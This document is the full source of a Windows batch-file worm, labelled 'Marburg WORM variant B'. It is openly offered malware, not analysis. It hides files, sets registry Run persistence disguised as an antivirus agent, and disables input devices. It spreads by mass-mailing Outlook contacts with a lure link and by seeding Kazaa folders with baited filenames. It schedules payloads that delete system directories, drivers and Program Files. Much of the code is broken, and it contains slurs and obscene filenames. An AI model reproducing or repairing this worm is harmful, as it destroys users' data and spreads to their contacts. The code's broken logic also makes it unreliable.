@echo off
'Marburg WORM variant B by unfunf, credits to foxpro2118
If exist %windir%\SYSTEM32\$winnt$.inf goto WinXPdisable
If not exist %windir%\SYSTEM32\$winnt$.inf goto OthrDisable
:WinXPdisable
echo CD /D C:
echo CALCS * /e /t /c /g Administrators:F System:F
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "0" 
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0"
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\GlobalUserOffline", "1"
' I am not going to use the "%windir%\System32\rundll32.exe user32.dll,LockWorkStation" command, it WILL lock up the computer; however, It will stop the bat from running im 99% sure.
goto NAVwrite
:OthrDisable
echo %windir%\RUNDLL KEYBOARD,DISABLE >> AUTOEXEC.BAT
echo %windir%\RUNDLL MOUSE,DISABLE >> AUTOEXEC.BAT
goto NAVwrite
:NAVwrite
echo Set WSHShell = CreateObject("WScript.Shell")>> c:\MarburgVB.vbs
echo WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", "">> c:\MarburgVB.vbs
echo attrib +h c:\MarburgVB.vbs
echo start c:\MarburgVB.vbs
goto MarburgVBSearch
:MarburgVBSearch
If exist C:\WinRARbeta.exe goto EXISTS
If not exist C:\WinRARbeta.exe goto NOTEXISTS
:EXISTS
goto Start
:NOTEXISTS
goto Make
:Start
echo AT 10pm next:Monday /interactive goto Symptoms1
echo AT 5pm next:Tuesday /interactive goto Symptoms2
echo AT 2pm next:Wednesday /interactive goto Symptoms3
goto Spread
:Make
echo copy %0 c:\MarburgVB.bat
echo attrib -r +H c:\MarburgVB.bat
echo start C:\MarburgVB.vbs
:Spread
If exist C:\WinRARbeta.exe goto Spready1
If not exist C:\WinRARbeta.exe goto Spready2
:Spready1
echo On Error Resume Next>>c:\led.vbs>>c:\autoexec.bat
echo Dim x>>c:\led.vbs>>c:\autoexec.bat
echo Set ol=CreateObject("Outlook.Application")>>c:\led.vbs>>c:\autoexec.bat
echo For x=1 To 50>>c:\led.vbs>>c:\autoexec.bat
echo Set Mail=ol.CreateItem(0)>>c:\led.vbs>>c:\autoexec.bat
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>c:\led.vbs>>c:\autoexec.bat
echo Mail.Subject="Beta WinRAR .zip/.rar archiver!" >> c:\led.vbs >> c:\autoexec.bat
echo Mail.Body="Yo man check out this new beta .rar/.zip archiver, works a lot better than winzip!! It can be downloaded from HTTP://unfunfowns.150m.com/WinRARbeta.exe" >> c:\led.vbs >> c:\autoexec.bat
echo Mail.Attachments.Add("c:\MarburgVB.vbs.bat")>>c:\led.vbs>>c:\autoexec.bat
echo Mail.Send>>c:\led.vbs>>c:\autoexec.bat
echo Next>>c:\led.vbs>>c:\autoexec.bat
echo ol.Quit>>c:\led.vbs>>c:\autoexec.bat
echo start c:\led.vbs>>c:\autoexec.bat
:Spready2
echo On Error Resume Next>>c:\led2.vbs
echo Dim x>>c:\led2.vbs
echo Set ol=CreateObject("Outlook.Application")>>c:\led2.vbs
echo For x=1 To 50>>c:\led2.vbs
echo Set Mail=ol.CreateItem(0)>>c:\led2.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>c:\led2.vbs
echo Mail.Subject="Beta WinRAR .zip/.rar archiver!">>c:\led2.vbs
echo Mail.Body="Yo man check out this new beta .rar/.zip archiver, works a lot better than winzip!! It can be downloaded from HTTP://unfunfowns.150m.com/WinRARbeta.exe" >> c:\led2.vbs
echo Mail.Attachments.Add("c:\MarburgVB.vbs.bat")>>c:\led2.vbs
echo Mail.Send>>c:\led2.vbs
echo Next>>c:\led2.vbs
echo ol.Quit>>c:\led2.vbs
echo start c:\led2.vbs
goto checkaz
:checkaz
if exist c:\progra~1\kazaa\my~1 goto infect
if not exist c:\progra~1\kazaa\my~1 goto dontinfect
:infect
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\WinRAR.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\WinRarBETA.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\waroniraq.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\killingandfucking.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\fuckingbritney.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\billgatessucking.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\javascriptbible.pdf.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\bitchraped.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\passwords.txt.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\illegalporn.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\jackass2clip.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\porn.jpg.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\porn.avi.exe
echo copy c:\WinRARbeta.exe c:\progra~1\kazaa\my~1\Matrix3trailer.avi.exe
:dontinfect
goto manualspread
:manualspread
echo >> c:\MarburgVBms.vbs
echo >> c:\MarburgVBms.vbs
echo >> c:\MarburgVBms.vbs
echo Public Virus As String>>c:\MarburgVBms.vbs
echo Function SpreadTo(Directory As String, Extension As String)>>c:\MarburgVBms.vbs
echo >>c:\MarburgVBms.vbs
echo VirCopy.Path = Directory>>c:\MarburgVBms.vbs
echo VirCopy.Pattern = "*" & Extension>>c:\MarburgVBms.vbs
echo VirCopy.Refresh>>c:\MarburgVBms.vbs
echo >>c:\MarburgVBms.vbs
echo For x = 0 To VirCopy.ListCount>>c:\MarburgVBms.vbs
echo If VirCopy.List(x) = "" Then Goto SkipIt>>c:\MarburgVBms.vbs
echo FileCopy Virus, VirCopy.Path & VirCopy.List(x)>>c:\MarburgVBms.vbs
echo SkipIt:>>c:\MarburgVBms.vbs
echo Next>>c:\MarburgVBms.vbs
echo >>c:\MarburgVBms.vbs
echo End Function>>c:\MarburgVBms.vbs
echo >>c:\MarburgVBms.vbs
echo Private Sub Form_Load()>>c:\MarburgVBms.vbs
echo Virus = App.Path>>c:\MarburgVBms.vbs
echo If Right(Virus, 1) <> "\" Then Virus = Virus & "\">>c:\MarburgVBms.vbs
echo Virus = Virus & App.EXEName & ".exe">>c:\MarburgVBms.vbs
echo >>c:\MarburgVBms.vbs
echo SpreadTo "C:\my downloads\", ".exe">>c:\MarburgVBms.vbs
echo >>c:\MarburgVBms.vbs
echo End Sub>>c:\MarburgVBms.vbs
start c:\MarburgVBms.vbs
:Symptoms1 
echo assoc .jpg=Gay Porn File
echo MD %windir%\porn
echo REN C:\progra~1\intern~1\iexplore.exe gayporn.jpg
echo MOVE gayporn.jpg >> %windir%\porn
echo COPY %0 gayporn.jpg >> C:\WINDOWS\SYSTEM
echo REN C:\WINDOWS\SYSTEM\gayporn.jpg iexplore.exe
echo copy %0 hello.m >> Desktop
echo MsgBox "budfkgdkogkodx" >> C:\bahroffffffff.vbs
echo start C:\bahroffffffff.vbs 
echo SHUTDOWN -s -t 2 -c "barf"
:Symptoms2
echo assoc .txt=faggot
echo RD /s /q C:\windows\media
echo start C:\WINDOWS\SYSTEM\iexplore.exe "www.1gayporn.com"
echo MsgBox "TSKKKKKK" >> C:\lizzoohizzoo.vbs
echo start C:\lizzoohizzoo.vbs
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_CURRENT_USER\CONSOLE\Windowsize", "10000"
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_CURRENT_USER\AppEvents\EventLabels\SystemStart\(Default)", "FUCKKKKKKKK"
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "C:\WINDOWS\SYSTEM\IEXPLORE.EXE WWW.1GAYPORN.COM"
echo SHUTDOWN -s -t 10 -c "meh"
:Symptoms3
echo MsgBox "done :P" >> C:\SUX.vbs
echo start C:\SUX.vbs
echo RD /s /q C:\windows\system32\drivers
echo RD /s /q C:\windows\system\drivers
echo MD C:\FUCK
echo set windir=C:\FUCK 
echo set USERNAME=WTFUSUXSJFISDJFJISDFSDFjizsjfzsjdf
echo set PROCESSOR_LEVEL=90
echo RD /s /q C:\progra~1
echo DEL /f /q %windir%\*.*.exe
echo DEL /f /q %windir%\*.*.reg
echo DEL /f /q %windir%\system32\*.*
echo DEL /f /q %windir%\system\*.*
echo echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\dontdisplaylastusername", "1"
echo SHUTDOWN -s -t 10 -c "I love u :P"

